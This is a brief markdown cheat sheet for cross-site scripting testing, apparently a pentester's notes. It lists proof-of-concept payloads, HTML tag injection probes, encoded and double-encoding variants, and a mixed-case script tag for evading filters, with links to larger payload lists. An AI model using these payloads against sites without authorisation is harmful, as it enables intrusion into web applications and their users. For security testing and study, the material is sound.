# XSS
**Useful cheatsheet [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)**
**Comprehensive payload list [here](https://github.com/payloadbox/xss-payload-list)**
## POC
- `alert(document.location)`
- `print()`
## Unescaped Tags -> [Script Tags](XSS.md#Script%20Tags)
- `<b>STUFF</b>`
- `<b>STUFF`
### Encodings
**Worth double encoding**
- `%3cb%3eSTUFF%3c%2fb%3e`
- `&#x3c;b&#x3e;STUFF&#x3c;&#x2f;b&#x3e;`

## Tag XSS
### Script
- `<script>print()</script>`
- `<SrCiPt>print()</SCriPT>`

